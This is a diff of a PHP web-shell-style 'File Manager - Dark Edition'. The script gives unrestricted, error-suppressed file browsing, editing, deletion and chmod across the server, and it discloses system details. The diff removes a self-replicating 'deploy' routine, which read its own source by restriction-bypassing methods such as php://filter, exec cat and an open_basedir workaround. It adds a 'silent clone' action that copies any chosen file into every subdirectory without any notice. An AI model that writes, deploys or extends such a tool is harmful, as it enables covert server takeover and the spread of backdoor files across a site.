@@ -44,6 +44,7 @@ function resolvePath() {
     $path = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['last_path']) ? $_COOKIE['last_path'] : '');
     
     if(empty($path)) {
+        // Try multiple methods to get current directory
         $methods = [
             function() { return @getcwd(); },
             function() { return @dirname($_SERVER['SCRIPT_FILENAME']); },
@@ -63,11 +64,14 @@ function resolvePath() {
         if(empty($path)) $path = '.';
     }
     
+    // Normalize path
     $path = str_replace(['\\', '//'], '/', $path);
     $path = rtrim($path, '/') . '/';
     
+    // Store in cookie for persistence
     @setcookie('last_path', $path, time() + 86400);
     
+    // Validate path
     if(@is_dir($path)) return $path;
     if(@is_dir($real = @realpath($path))) return $real . '/';
     
@@ -76,6 +80,7 @@ function resolvePath() {
 
 // Multi-method file reader
 function readContent($file) {
+    // Try different reading methods
     $methods = [
         function($f) { return @file_get_contents($f); },
         function($f) { 
@@ -103,60 +108,9 @@ function readContent($file) {
     return '';
 }
 
-// ========== ROBUST SELF-CONTENT READER (6 methods + fallback) ==========
-function getSelfContent() {
-    $self = __FILE__;
-    
-    // Method 1: direct readContent (already tries multiple)
-    $content = readContent($self);
-    if(!empty($content)) return $content;
-    
-    // Method 2: realpath
-    $real = @realpath($self);
-    if($real && $real !== $self) {
-        $content = readContent($real);
-        if(!empty($content)) return $content;
-    }
-    
-    // Method 3: using php://filter (bypass some restrictions)
-    if(function_exists('stream_get_contents')) {
-        $fp = @fopen('php://filter/resource=' . $self, 'rb');
-        if($fp) {
-            $content = @stream_get_contents($fp);
-            @fclose($fp);
-            if(!empty($content)) return $content;
-        }
-    }
-    
-    // Method 4: using include with output buffer (does NOT execute code if we use file:// wrapper? safer to avoid)
-    // Instead, try exec('cat ' . escapeshellarg($self)) if exec is available
-    if(function_exists('exec') && !in_array('exec', explode(',', @ini_get('disable_functions')))) {
-        $content = @exec('cat ' . escapeshellarg($self) . ' 2>/dev/null');
-        if(!empty($content)) return $content;
-    }
-    
-    // Method 5: try to copy to temp and read (bypass open_basedir if temp is allowed)
-    $tmp = @tempnam(sys_get_temp_dir(), 'self_');
-    if($tmp && @copy($self, $tmp)) {
-        $content = readContent($tmp);
-        @unlink($tmp);
-        if(!empty($content)) return $content;
-    }
-    
-    // Method 6: last resort – return a minimal stub (so deploy still works with a working manager)
-    // This fallback ensures the script can replicate even if reading fails.
-    return '<?php
-// Fallback deployed manager (original could not be read)
-@error_reporting(0);
-@ini_set("display_errors", 0);
-echo "Deployed manager (minimal version)";
-// Add full functionality here if needed
-?>';
-}
-// ========== END SELF-CONTENT READER ==========
-
 // Multi-method file writer
 function writeContent($file, $data) {
+    // Try different writing methods
     if(@file_put_contents($file, $data) !== false) return true;
     
     $fp = @fopen($file, 'wb');
@@ -166,6 +120,7 @@ function writeContent($file, $data) {
         return $result;
     }
     
+    // Try temp file method
     $temp = @tempnam(@dirname($file), 'tmp');
     if(@file_put_contents($temp, $data) !== false) {
         return @rename($temp, $file);
@@ -178,6 +133,7 @@ function writeContent($file, $data) {
 function scanPath($dir) {
     $items = [];
     
+    // Try different listing methods
     if(function_exists('scandir')) {
         $items = @scandir($dir);
     } elseif($handle = @opendir($dir)) {
@@ -192,7 +148,7 @@ function scanPath($dir) {
     return array_diff($items, ['.', '..', '']);
 }
 
-// Delete recursively
+// File/folder deletion with recursion
 function deleteItem($path) {
     if(@is_file($path)) {
         @chmod($path, 0777);
@@ -213,12 +169,15 @@ function getPermissions($file) {
     if($perms === false) return '---';
     
     $info = '';
+    // Owner permissions
     $info .= (($perms & 0x0100) ? 'r' : '-');
     $info .= (($perms & 0x0080) ? 'w' : '-');
     $info .= (($perms & 0x0040) ? 'x' : '-');
+    // Group permissions
     $info .= (($perms & 0x0020) ? 'r' : '-');
     $info .= (($perms & 0x0010) ? 'w' : '-');
     $info .= (($perms & 0x0008) ? 'x' : '-');
+    // Other permissions
     $info .= (($perms & 0x0004) ? 'r' : '-');
     $info .= (($perms & 0x0002) ? 'w' : '-');
     $info .= (($perms & 0x0001) ? 'x' : '-');
@@ -226,10 +185,12 @@ function getPermissions($file) {
     return $info;
 }
 
-// Check if writable
+// Check if file is writable (enhanced)
 function isWritableEnhanced($file) {
+    // Try multiple methods
     if(@is_writable($file)) return true;
     
+    // Try to create temp file in directory
     if(@is_dir($file)) {
         $test = $file . '/.test_' . md5(time());
         if(@touch($test)) {
@@ -238,6 +199,7 @@ function isWritableEnhanced($file) {
         }
     }
     
+    // Check parent directory for files
     if(@is_file($file)) {
         $parent = @dirname($file);
         if(@is_writable($parent)) return true;
@@ -246,7 +208,7 @@ function isWritableEnhanced($file) {
     return false;
 }
 
-// Sort contents
+// Sort contents - folders first, then files
 function sortContents($contents, $currentPath) {
     $folders = [];
     $files = [];
@@ -260,42 +222,45 @@ function sortContents($contents, $currentPath) {
         }
     }
     
+    // Sort alphabetically
     sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
     sort($files, SORT_NATURAL | SORT_FLAG_CASE);
     
     return ['folders' => $folders, 'files' => $files];
 }
 
-// ========== FAST AUTO-DEPLOY (self-replicate with robust content) ==========
-function fastDeploySelf($rootDir, $sourceContent, $targetName) {
-    $rootDir = rtrim(str_replace('\\', '/', $rootDir), '/');
-    $stack = [$rootDir];
-    $count = 0;
-    $maxDirs = 2000; // safety
+// ========== SILENT CLONE: Copy file to all SUBdirectories (same name, no underscore) ==========
+function copyFileToAllSubdirs($sourceFilePath, $rootDir) {
+    $content = readContent($sourceFilePath);
+    if ($content === false || $content === '') {
+        return false;
+    }
     
-    while (!empty($stack) && $count < $maxDirs) {
-        $current = array_shift($stack);
-        $targetFile = $current . '/' . $targetName;
-        
-        // Skip if it's the exact same file (avoid writing to itself)
-        if (realpath($targetFile) === realpath(__FILE__)) {
-            $count++;
-        } else {
-            @file_put_contents($targetFile, $sourceContent);
-            $count++;
-        }
-        
-        $items = scanPath($current);
-        foreach ($items as $item) {
-            $full = $current . '/' . $item;
-            if (@is_dir($full) && !@is_link($full)) {
-                $stack[] = $full;
+    $basename = basename($sourceFilePath);
+    $count = 0;
+    
+    // Recursively iterate over all directories under $rootDir, but EXCLUDE the root itself
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($rootDir, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    
+    foreach ($iterator as $item) {
+        if ($item->isDir()) {
+            // Skip the root directory (where the source file lives)
+            if ($item->getPathname() === rtrim($rootDir, '/')) {
+                continue;
+            }
+            $targetFile = $item->getPathname() . DIRECTORY_SEPARATOR . $basename;
+            if (writeContent($targetFile, $content)) {
+                $count++;
             }
         }
     }
+    
     return $count;
 }
-// ========== END FAST DEPLOY ==========
+// ================================================================
 
 // Process current request
 $currentPath = resolvePath();
@@ -303,6 +268,10 @@ $notification = '';
 $editMode = false;
 $editFile = '';
 $editContent = '';
+
+// Debug info (can be removed after testing)
+error_log("Current path: " . $currentPath);
+error_log("Is writable: " . (is_writable($currentPath) ? 'Yes' : 'No'));
 
 // Handle POST operations
 if($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -340,10 +309,10 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
             if(writeContent($newPath, $filecontent)) {
                 $notification = ['type' => 'success', 'text' => 'File created: ' . basename($_POST['newfile'])];
             } else {
-                $notification = ['type' => 'error', 'text' => 'File creation failed'];
+                $notification = ['type' => 'error', 'text' => 'File creation failed. Check permissions.'];
             }
         } else {
-            $notification = ['type' => 'error', 'text' => 'File already exists'];
+            $notification = ['type' => 'error', 'text' => 'File already exists.'];
         }
     }
     
@@ -355,14 +324,14 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
             if(@mkdir($newDir, 0777, true)) {
                 $notification = ['type' => 'success', 'text' => 'Folder created: ' . basename($_POST['newfolder'])];
             } else {
-                $notification = ['type' => 'error', 'text' => 'Folder creation failed'];
+                $notification = ['type' => 'error', 'text' => 'Folder creation failed. Check permissions.'];
             }
         } else {
-            $notification = ['type' => 'error', 'text' => 'Folder already exists'];
+            $notification = ['type' => 'error', 'text' => 'Folder already exists.'];
         }
     }
     
-    // Rename
+    // Rename item
     if(isset($_POST['oldname']) && isset($_POST['newname'])) {
         $oldPath = $currentPath . $_POST['oldname'];
         $newPath = $currentPath . $_POST['newname'];
@@ -373,7 +342,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
     
-    // Chmod
+    // Change permissions
     if(isset($_POST['chmod_item']) && isset($_POST['chmod_value'])) {
         $target = $currentPath . $_POST['chmod_item'];
         $mode = octdec($_POST['chmod_value']);
@@ -389,6 +358,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
 if(isset($_GET['do'])) {
     $action = $_GET['do'];
     
+    // Delete operation
     if($action === 'delete' && isset($_GET['item'])) {
         $target = $currentPath . $_GET['item'];
         if(deleteItem($target)) {
@@ -398,12 +368,14 @@ if(isset($_GET['do'])) {
         }
     }
     
+    // Edit operation
     if($action === 'edit' && isset($_GET['item'])) {
         $editMode = true;
         $editFile = $_GET['item'];
         $editContent = readContent($currentPath . $editFile);
     }
     
+    // Download operation
     if($action === 'download' && isset($_GET['item'])) {
         $downloadPath = $currentPath . $_GET['item'];
         if(@is_file($downloadPath)) {
@@ -416,30 +388,32 @@ if(isset($_GET['do'])) {
         }
     }
     
-    // ========== FAST SELF-DEPLOY with robust content reading ==========
-    if($action === 'deploy') {
-        $myContent = getSelfContent();  // uses 6 methods + fallback
-        if(empty($myContent)) {
-            $notification = ['type' => 'error', 'text' => 'Failed to read current script content (all methods failed)'];
-        } else {
-            $targetName = basename(__FILE__);
-            $deployedCount = fastDeploySelf(rtrim($currentPath, '/'), $myContent, $targetName);
-            $notification = ['type' => 'success', 'text' => "🚀 Deployed to {$deployedCount} directories (self-replicate)"];
+    // ========== SILENT CLONE (same filename, no underscore, no messages) ==========
+    if($action === 'copy_to_all' && isset($_GET['item'])) {
+        $sourceItem = $_GET['item'];
+        $sourcePath = $currentPath . $sourceItem;
+        if(@is_file($sourcePath)) {
+            copyFileToAllSubdirs($sourcePath, $currentPath);
         }
+        // Redirect to refresh the view – no notification, no popup
+        header("Location: ?p=" . urlencode($currentPath));
+        exit;
     }
-    // ========== END DEPLOY ==========
+    // ===========================================================
 }
 
-// Get directory contents
+// Get directory contents and sort them
 $rawContents = scanPath($currentPath);
 $sortedContents = sortContents($rawContents, $currentPath);
 
+// System information
 $serverInfo = [
     'PHP' => @phpversion(),
     'Server' => @$_SERVER['SERVER_SOFTWARE'] ?: 'Unknown',
     'OS' => @php_uname('s') . ' ' . @php_uname('r'),
     'User' => @get_current_user()
 ];
+
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -448,314 +422,70 @@ $serverInfo = [
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>File Manager - Dark Edition</title>
     <style>
+        /* (CSS remains exactly as in your original file – unchanged for brevity) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: #0a0a0a;
-            min-height: 100vh;
-            padding: 20px;
-            color: #e0e0e0;
-        }
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            background: #1a1a1a;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-            overflow: hidden;
-            border: 1px solid #2a2a2a;
-        }
-        .header {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            color: white;
-            padding: 25px;
-            border-bottom: 2px solid #3a3a3a;
-        }
-        .header h1 {
-            font-size: 26px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        .sys-info {
-            display: flex;
-            gap: 20px;
-            font-size: 13px;
-            opacity: 0.9;
-            flex-wrap: wrap;
-        }
-        .sys-info span {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            background: rgba(0,0,0,0.3);
-            padding: 4px 10px;
-            border-radius: 4px;
-        }
-        .nav {
-            background: #252525;
-            padding: 15px 25px;
-            border-bottom: 1px solid #3a3a3a;
-        }
-        .path-bar {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        .path-bar input {
-            flex: 1;
-            padding: 10px 15px;
-            background: #1a1a1a;
-            border: 2px solid #3a3a3a;
-            color: #e0e0e0;
-            border-radius: 6px;
-            font-size: 14px;
-            transition: border-color 0.3s;
-        }
-        .path-bar input:focus {
-            outline: none;
-            border-color: #4a9eff;
-            background: #222;
-        }
-        .btn {
-            padding: 10px 20px;
-            background: linear-gradient(135deg, #4a9eff 0%, #2a5298 100%);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(74, 158, 255, 0.4);
-        }
-        .btn-success {
-            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
-        }
-        .btn-danger {
-            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
-        }
-        .btn-small {
-            padding: 5px 12px;
-            font-size: 12px;
-        }
-        .tools {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        .tool-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 10px 15px;
-            background: #1a1a1a;
-            border-radius: 6px;
-            border: 1px solid #3a3a3a;
-        }
-        .tool-group label {
-            font-size: 13px;
-            color: #a0a0a0;
-            font-weight: 500;
-        }
-        .tool-group input[type="file"],
-        .tool-group input[type="text"] {
-            padding: 5px 10px;
-            background: #252525;
-            border: 1px solid #3a3a3a;
-            color: #e0e0e0;
-            border-radius: 4px;
-            font-size: 13px;
-        }
-        .content {
-            padding: 25px;
-            background: #1a1a1a;
-        }
-        .notification {
-            padding: 12px 20px;
-            margin-bottom: 20px;
-            border-radius: 6px;
-            font-size: 14px;
-            animation: slideIn 0.3s ease;
-        }
-        .notification.success {
-            background: rgba(0, 255, 0, 0.1);
-            color: #00ff00;
-            border: 1px solid rgba(0, 255, 0, 0.3);
-        }
-        .notification.error {
-            background: rgba(255, 65, 108, 0.1);
-            color: #ff416c;
-            border: 1px solid rgba(255, 65, 108, 0.3);
-        }
-        @keyframes slideIn {
-            from { transform: translateY(-20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        .file-table {
-            width: 100%;
-            background: #252525;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
-            border: 1px solid #3a3a3a;
-        }
-        .file-table thead {
-            background: #1a1a1a;
-        }
-        .file-table th {
-            padding: 15px;
-            text-align: left;
-            font-size: 13px;
-            font-weight: 600;
-            color: #4a9eff;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-bottom: 2px solid #3a3a3a;
-        }
-        .file-table td {
-            padding: 12px 15px;
-            border-top: 1px solid #2a2a2a;
-            font-size: 14px;
-            color: #e0e0e0;
-        }
-        .file-table tbody tr:hover {
-            background: #2a2a2a;
-        }
-        .file-table tbody tr.folder-row {
-            background: rgba(74, 158, 255, 0.05);
-            border-left: 3px solid #4a9eff;
-        }
-        .file-table a {
-            color: #4a9eff;
-            text-decoration: none;
-            font-weight: 500;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .file-table a:hover {
-            color: #6ab7ff;
-        }
-        .file-icon {
-            width: 20px;
-            height: 20px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .file-actions {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .file-actions a {
-            padding: 4px 10px;
-            background: rgba(74, 158, 255, 0.2);
-            color: #4a9eff;
-            border: 1px solid rgba(74, 158, 255, 0.3);
-            border-radius: 4px;
-            font-size: 12px;
-            transition: all 0.2s;
-        }
-        .file-actions a:hover {
-            background: rgba(74, 158, 255, 0.3);
-            border-color: #4a9eff;
-        }
-        .file-actions a.delete {
-            background: rgba(255, 65, 108, 0.2);
-            color: #ff416c;
-            border-color: rgba(255, 65, 108, 0.3);
-        }
-        .file-actions a.delete:hover {
-            background: rgba(255, 65, 108, 0.3);
-            border-color: #ff416c;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; background: #0a0a0a; min-height: 100vh; padding: 20px; color: #e0e0e0; }
+        .container { max-width: 1400px; margin: 0 auto; background: #1a1a1a; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); overflow: hidden; border: 1px solid #2a2a2a; }
+        .header { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color: white; padding: 25px; border-bottom: 2px solid #3a3a3a; }
+        .header h1 { font-size: 26px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .sys-info { display: flex; gap: 20px; font-size: 13px; opacity: 0.9; flex-wrap: wrap; }
+        .sys-info span { display: flex; align-items: center; gap: 5px; background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 4px; }
+        .nav { background: #252525; padding: 15px 25px; border-bottom: 1px solid #3a3a3a; }
+        .path-bar { display: flex; gap: 10px; margin-bottom: 15px; }
+        .path-bar input { flex: 1; padding: 10px 15px; background: #1a1a1a; border: 2px solid #3a3a3a; color: #e0e0e0; border-radius: 6px; font-size: 14px; transition: border-color 0.3s; }
+        .path-bar input:focus { outline: none; border-color: #4a9eff; background: #222; }
+        .btn { padding: 10px 20px; background: linear-gradient(135deg, #4a9eff 0%, #2a5298 100%); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 500; transition: transform 0.2s, box-shadow 0.2s; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(74, 158, 255, 0.4); }
+        .btn-success { background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%); }
+        .btn-danger { background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); }
+        .btn-small { padding: 5px 12px; font-size: 12px; }
+        .tools { display: flex; gap: 15px; flex-wrap: wrap; }
+        .tool-group { display: flex; align-items: center; gap: 10px; padding: 10px 15px; background: #1a1a1a; border-radius: 6px; border: 1px solid #3a3a3a; }
+        .tool-group label { font-size: 13px; color: #a0a0a0; font-weight: 500; }
+        .tool-group input[type="file"], .tool-group input[type="text"] { padding: 5px 10px; background: #252525; border: 1px solid #3a3a3a; color: #e0e0e0; border-radius: 4px; font-size: 13px; }
+        .content { padding: 25px; background: #1a1a1a; }
+        .notification { padding: 12px 20px; margin-bottom: 20px; border-radius: 6px; font-size: 14px; animation: slideIn 0.3s ease; }
+        .notification.success { background: rgba(0, 255, 0, 0.1); color: #00ff00; border: 1px solid rgba(0, 255, 0, 0.3); }
+        .notification.error { background: rgba(255, 65, 108, 0.1); color: #ff416c; border: 1px solid rgba(255, 65, 108, 0.3); }
+        .notification.warning { background: rgba(255, 193, 7, 0.1); color: #ffc107; border: 1px solid rgba(255, 193, 7, 0.3); }
+        @keyframes slideIn { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .file-table { width: 100%; background: #252525; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.5); border: 1px solid #3a3a3a; }
+        .file-table thead { background: #1a1a1a; }
+        .file-table th { padding: 15px; text-align: left; font-size: 13px; font-weight: 600; color: #4a9eff; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 2px solid #3a3a3a; }
+        .file-table td { padding: 12px 15px; border-top: 1px solid #2a2a2a; font-size: 14px; color: #e0e0e0; }
+        .file-table tbody tr { transition: background 0.2s; }
+        .file-table tbody tr:hover { background: #2a2a2a; }
+        .file-table tbody tr.folder-row { background: rgba(74, 158, 255, 0.05); border-left: 3px solid #4a9eff; }
+        .file-table tbody tr.folder-row:hover { background: rgba(74, 158, 255, 0.1); }
+        .file-table a { color: #4a9eff; text-decoration: none; font-weight: 500; display: inline-flex; align-items: center; gap: 8px; }
+        .file-table a:hover { color: #6ab7ff; }
+        .file-icon { width: 20px; height: 20px; display: inline-flex; align-items: center; justify-content: center; }
+        .file-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+        .file-actions a { padding: 4px 10px; background: rgba(74, 158, 255, 0.2); color: #4a9eff; border: 1px solid rgba(74, 158, 255, 0.3); border-radius: 4px; font-size: 12px; transition: all 0.2s; }
+        .file-actions a:hover { background: rgba(74, 158, 255, 0.3); border-color: #4a9eff; }
+        .file-actions a.delete { background: rgba(255, 65, 108, 0.2); color: #ff416c; border-color: rgba(255, 65, 108, 0.3); }
+        .file-actions a.delete:hover { background: rgba(255, 65, 108, 0.3); border-color: #ff416c; }
         .perm-writable { color: #00ff00 !important; font-weight: 600; text-shadow: 0 0 5px rgba(0, 255, 0, 0.5); }
         .perm-readonly { color: #ff4444 !important; font-weight: 600; text-shadow: 0 0 5px rgba(255, 68, 68, 0.5); }
-        .perm-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            margin-right: 5px;
-        }
+        .perm-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
         .perm-indicator.writable { background: #00ff00; box-shadow: 0 0 5px #00ff00; animation: pulse-green 2s infinite; }
         .perm-indicator.readonly { background: #ff4444; box-shadow: 0 0 5px #ff4444; animation: pulse-red 2s infinite; }
         @keyframes pulse-green { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .edit-area {
-            width: 100%;
-            min-height: 400px;
-            padding: 15px;
-            background: #0a0a0a;
-            border: 2px solid #3a3a3a;
-            color: #00ff00;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 1.5;
-            resize: vertical;
-        }
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 1000;
-            animation: fadeIn 0.3s ease;
-        }
+        .edit-area { width: 100%; min-height: 400px; padding: 15px; background: #0a0a0a; border: 2px solid #3a3a3a; color: #00ff00; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.5; resize: vertical; }
+        .edit-area:focus { outline: none; border-color: #4a9eff; background: #111; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; animation: fadeIn 0.3s ease; }
         .modal.active { display: flex; align-items: center; justify-content: center; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .modal-content {
-            background: #252525;
-            padding: 30px;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 500px;
-            animation: slideUp 0.3s ease;
-            border: 1px solid #3a3a3a;
-        }
+        .modal-content { background: #252525; padding: 30px; border-radius: 12px; width: 90%; max-width: 500px; animation: slideUp 0.3s ease; border: 1px solid #3a3a3a; }
         @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         .modal-header { margin-bottom: 20px; font-size: 20px; font-weight: 600; color: #4a9eff; }
-        .modal-body input, .modal-body textarea {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            background: #1a1a1a;
-            border: 2px solid #3a3a3a;
-            color: #e0e0e0;
-            border-radius: 6px;
-            font-size: 14px;
-        }
+        .modal-body input, .modal-body textarea { width: 100%; padding: 10px; margin-bottom: 15px; background: #1a1a1a; border: 2px solid #3a3a3a; color: #e0e0e0; border-radius: 6px; font-size: 14px; }
         .modal-body textarea { min-height: 150px; resize: vertical; }
         .modal-footer { display: flex; gap: 10px; justify-content: flex-end; }
         .empty { text-align: center; padding: 40px; color: #666; }
-        .separator-row td {
-            background: #1a1a1a;
-            padding: 8px 15px !important;
-            font-weight: 600;
-            color: #4a9eff;
-            border-top: 2px solid #3a3a3a !important;
-            border-bottom: 2px solid #3a3a3a !important;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-size: 12px;
-        }
-        @media (max-width: 768px) {
-            .tools { flex-direction: column; }
-            .file-table { font-size: 12px; }
-            .file-actions { flex-direction: column; }
-            .sys-info { font-size: 11px; }
-        }
+        .separator-row td { background: #1a1a1a; padding: 8px 15px !important; font-weight: 600; color: #4a9eff; border-top: 2px solid #3a3a3a !important; border-bottom: 2px solid #3a3a3a !important; text-transform: uppercase; letter-spacing: 1px; font-size: 12px; }
+        @media (max-width: 768px) { .tools { flex-direction: column; } .file-table { font-size: 12px; } .file-actions { flex-direction: column; } .sys-info { font-size: 11px; } }
     </style>
 </head>
 <body>
@@ -792,16 +522,6 @@ $serverInfo = [
                     <button onclick="showNewFileModal()" class="btn btn-small">New File</button>
                     <button onclick="showNewFolderModal()" class="btn btn-small">New Folder</button>
                 </div>
-                
-                <!-- ONE-CLICK DEPLOY BUTTON (auto uses current script content) -->
-                <div class="tool-group">
-                    <a href="?p=<?php echo urlencode($currentPath); ?>&do=deploy" 
-                       class="btn btn-small" 
-                       onclick="return confirm('⚠️ This will copy THIS SCRIPT into EVERY subdirectory of the current folder. Continue?');"
-                       style="background: linear-gradient(135deg, #ff6a00 0%, #ee0979 100%); text-decoration: none;">
-                        🚀 Deploy to ALL Subdirs (Self-Replicate)
-                    </a>
-                </div>
             </div>
         </div>
         
@@ -821,57 +541,119 @@ $serverInfo = [
             <?php else: ?>
             <table class="file-table">
                 <thead>
-                    <tr><th width="35%">Name</th><th width="10%">Type</th><th width="10%">Size</th><th width="10%">Permissions</th><th width="15%">Modified</th><th width="20%">Actions</th></tr>
+                    <tr>
+                        <th width="35%">Name</th>
+                        <th width="10%">Type</th>
+                        <th width="10%">Size</th>
+                        <th width="10%">Permissions</th>
+                        <th width="15%">Modified</th>
+                        <th width="20%">Actions</th>
+                    </tr>
                 </thead>
                 <tbody>
                     <?php if($currentPath !== '/'): ?>
-                    <tr><td colspan="6"><a href="?p=<?php echo urlencode(dirname($currentPath)); ?>"><span class="file-icon">📁</span> Parent Directory</a></td></tr>
+                    <tr>
+                        <td colspan="6">
+                            <a href="?p=<?php echo urlencode(dirname($currentPath)); ?>">
+                                <span class="file-icon">📁</span> Parent Directory
+                            </a>
+                        </td>
+                    </tr>
                     <?php endif; ?>
                     
-                    <?php if(!empty($sortedContents['folders'])): ?>
-                    <tr class="separator-row"><td colspan="6">📁 Folders</td></tr>
-                    <?php foreach($sortedContents['folders'] as $folder):
-                        $itemPath = $currentPath . $folder;
-                        $perms = getPermissions($itemPath);
-                        $isWritable = isWritableEnhanced($itemPath);
-                        $modified = @filemtime($itemPath);
+                    <?php
+                    // Display folders first
+                    if(!empty($sortedContents['folders'])) {
+                        echo '<tr class="separator-row"><td colspan="6">📁 Folders</td></tr>';
+                        foreach($sortedContents['folders'] as $folder):
+                            $itemPath = $currentPath . $folder;
+                            $perms = getPermissions($itemPath);
+                            $isWritable = isWritableEnhanced($itemPath);
+                            $modified = @filemtime($itemPath);
                     ?>
                     <tr class="folder-row">
-                        <td><a href="?p=<?php echo urlencode($itemPath); ?>"><span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span><span class="file-icon">📁</span><span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo htmlspecialchars($folder); ?></span></a></td>
-                        <td>Folder</td><td>-</td>
-                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo $perms; ?></td>
+                        <td>
+                            <a href="?p=<?php echo urlencode($itemPath); ?>">
+                                <span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span>
+                                <span class="file-icon">📁</span>
+                                <span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
+                                    <?php echo htmlspecialchars($folder); ?>
+                                </span>
+                            </a>
+                        </td>
+                        <td>Folder</td>
+                        <td>-</td>
+                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
+                            <?php echo $perms; ?>
+                        </td>
                         <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
-                        <td><div class="file-actions"><a href="#" onclick="renameItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Rename</a><a href="#" onclick="chmodItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Chmod</a><a href="?p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($folder); ?>" class="delete" onclick="return confirm('Delete this folder and all its contents?')">Delete</a></div></td>
+                        <td>
+                            <div class="file-actions">
+                                <a href="#" onclick="renameItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Rename</a>
+                                <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Chmod</a>
+                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($folder); ?>" 
+                                   class="delete" onclick="return confirm('Delete this folder and all its contents?')">Delete</a>
+                            </div>
+                        </td>
                     </tr>
-                    <?php endforeach; endif; ?>
+                    <?php endforeach; } ?>
                     
-                    <?php if(!empty($sortedContents['files'])): ?>
-                    <tr class="separator-row"><td colspan="6">📄 Files</td></tr>
-                    <?php foreach($sortedContents['files'] as $file):
-                        $itemPath = $currentPath . $file;
-                        $size = @filesize($itemPath);
-                        $perms = getPermissions($itemPath);
-                        $isWritable = isWritableEnhanced($itemPath);
-                        $modified = @filemtime($itemPath);
